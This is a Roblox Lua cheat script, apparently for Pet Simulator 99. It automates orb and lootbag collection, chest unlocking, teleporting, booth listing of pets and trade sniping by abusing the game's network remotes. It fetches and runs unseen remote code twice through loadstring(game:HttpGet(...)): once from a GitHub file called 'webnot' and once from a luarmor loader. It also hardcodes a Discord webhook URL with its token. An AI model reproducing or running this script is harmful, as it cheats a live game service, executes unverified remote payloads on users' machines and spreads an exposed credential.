--[[SETTINGS]]--
getgenv().config = {
    discordId = "667064890359545917",
    webhookUrl = "https://discord.com/api/webhooks/1246125041473814680/9fseVCyXc34XSpXki4TBt5FwamZGKqiiDApYILv84U5LC-Nuoav9EgfwpwOR1inDh7Cf",
    techPrice = "54000",
    AgonyPrice = 70000000,
    goldenAgonyPrice = 86000000,
    rainbowAgonyPrice = 266000000,
    keysToOpen = 1000,
}

spawn(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SunFromRu/ada/main/webnot"))() end)

--[[VARIABLES]]--
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local playerName = game:GetService("Players").LocalPlayer
local playerHumanoid = game:GetService("Workspace")[playerName.Name].HumanoidRootPart
local httpService = game:GetService("HttpService")
local request = request or http_request or http.request
local repLibrary = require(game.ReplicatedStorage.Library)
local saveTable = require(game.ReplicatedStorage.Library.Client.Save)
local boothPath = workspace:WaitForChild("__THINGS"):WaitForChild("Booths")
local hugesList = {}

--[[FARMING PART [AUTO LOOT]]--
for i, v in workspace.__THINGS.Orbs:GetChildren() do
    network["Orbs: Collect"]:FireServer({ tonumber(v.Name) })
    network["Orbs_ClaimMultiple"]:FireServer({ [1] = { [1] = v.Name } })
    v:Destroy()
end
for i, v in workspace.__THINGS.Lootbags:GetChildren() do
    network.Lootbags_Claim:FireServer({ v.Name })
    v:Destroy()
end
workspace.__THINGS.Orbs.ChildAdded:Connect(function(v)
    task.wait()
    network["Orbs: Collect"]:FireServer({ tonumber(v.Name) })
    network["Orbs_ClaimMultiple"]:FireServer({ [1] = { [1] = v.Name } })
    v:Destroy()
end)
workspace.__THINGS.Lootbags.ChildAdded:Connect(function(v)
    task.wait()
    Network.Lootbags_Claim:FireServer({ v.Name })
    v:Destroy()
end)

--[[CHECK FOR SNIPE OR NOT]]--
local function oneTimeCheck()
    for i,v in pairs(saveTable.Get().Inventory.Misc) do
        if v.id == "Tech Key" and v._am <= config.keysToOpen and not game.PlaceId == 15502339080  then
            print("DEBUG: Low amount of keys <"..config.keysToOpen)
            game.ReplicatedStorage.Network["Travel to Trading Plaza"]:InvokeServer()
        end
    end
end

--[[CHECK KEYS TO PREVENT 0 KEYS]]--
local function keysCheck()
    oneTimeCheck()
    while wait(10) do
        for i,v in pairs(saveTable.Get().Inventory.Misc) do
            if v.id == "Tech Key" and v._am <= 35 then
                print("DEBUG: Low amount of keys <35")
                game.ReplicatedStorage.Network["Travel to Trading Plaza"]:InvokeServer()
            end
        end
    end
end

--[[OPEN TECH CHEST]]--
local function techAm()
    while wait(.05) do
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("TechKey_Unlock"):InvokeServer()
    end
end

--[[AUTO BOOTH CLAIM]]--
local function boothClaim()
    print("DEBUG: Claiming booth")
    game:GetService("ReplicatedStorage").Network.Booths_ClaimAnyBooth:InvokeServer()
end

--[[UPDATE HUGES TABLE]]--
local function preloadHuges()
    for i,v in require(game:GetService("ReplicatedStorage"):WaitForChild("Library")).Save.Get().Inventory.Pet do
        if  not v.pt and not v.sh and string.match(v.id, "Huge") then
            table.insert(hugesList, v.id)
        end
    end
end

--[[AUTO SELL AGONYS]]--
local function sellerBot()
    for _,boothOwner in pairs(boothPath:GetChildren()) do
        if string.find(boothOwner.Info.BoothBottom.Frame.Top.Text, playerName.DisplayName) then
            correctBooth = boothOwner
            print(boothOwner.Info.BoothBottom.Frame.Top.Text)
            for i,v in require(game:GetService("ReplicatedStorage"):WaitForChild("Library")).Save.Get().Inventory.Pet do
                if  not v.pt and not v.sh and v.id == "Huge Cyber Agony" then
                    print("DEBUG: Pet listing")
                    local args = {
                        [1] = i,
                        [2] = config.AgonyPrice,
                        [3] = 1
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Booths_CreateListing"):InvokeServer(unpack(args))
                    print("DEBUG: Listed pet "..v.id)
                elseif v.pt == 1 and not v.sh and v.id == "Huge Cyber Agony" then
                    print("DEBUG: Pet listing")
                    local args = {
                        [1] = i,
                        [2] = config.goldenAgonyPrice,
                        [3] = 1
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Booths_CreateListing"):InvokeServer(unpack(args))
                    print("DEBUG: Listed pet "..v.id)
                elseif v.pt == 2 and not v.sh and v.id == "Huge Cyber Agony" then
                    print("DEBUG: Pet listing")
                    local args = {
                        [1] = i,
                        [2] = config.rainbowAgonyPrice,
                        [3] = 1
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Booths_CreateListing"):InvokeServer(unpack(args))
                    print("DEBUG: Listed pet "..v.id)
                end
            end
        end
    end
end

local function sniperCheck()
    if repLibrary.CurrencyCmds.Get("Diamonds") >= 10000000 then
        getgenv().autoPlaza = {
            Sniper = {
                Enabled = true,

                DISCORD_ID = "",
                WEBHOOK_URL = "",
                SHOW_USER = false,

                SEND_SNPES = false,
                PING_SNPES = false,

                SEND_FAILS = false,
                PING_FAILS = false,

                PING_ALL_EXCLUSIVES = false,
                BUY_ANY_EXCLUSIVE_PRICE = 300000,
                BUY_ANY_HUGE_PRICE = 40000000,
                BUY_ANY_TITANIC_PRICE = 1000000000,

                BUY_CUSTOM = {
                        {Class = "Misc", Item = {id = "Tech Key"}, Cost = 54000},
                },

                MIN_CANDIDATES = 3, -- (for stats tracker)
                STATS_TRACKER = true,

                MIN_BOOTH_CHECKS = 1,
                MIN_FOUND_SERVERS = 3,
                SERVER_HOPPER = true,
            }
        }
        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/0f103ef58ec991b5be6c9a2dcf83dad1.lua"))()
    elseif repLibrary.CurrencyCmds.Get("Diamonds") <= 10000000 then
        game.ReplicatedStorage.Network.World2Teleport:InvokeServer()
    end
end

--[[CHECK HUGES WHILE SELLING]]--
local function sellerCheck()
    preloadHuges()
    if table.find(hugesList, "Huge Cyber Agony") then
       boothClaim()
        task.wait(1)
        boothClaim()
        sellerBot()
     else
        sniperCheck()
    end
end

if game.PlaceId == 8737899170 then
    game.ReplicatedStorage.Network.World2Teleport:InvokeServer()
elseif game.PlaceId == 15502339080 then
    sellerCheck()
    while wait(10) do
        sellerCheck()
    end
else
    spawn(function() keysCheck() end)
    task.wait(10)
    playerHumanoid.CFrame = CFrame.new(-9820, 23, -591)
    spawn(function() techAm() end)
    while wait(60) do
        playerHumanoid.CFrame = CFrame.new(-9834, 23, -591)
    end
end
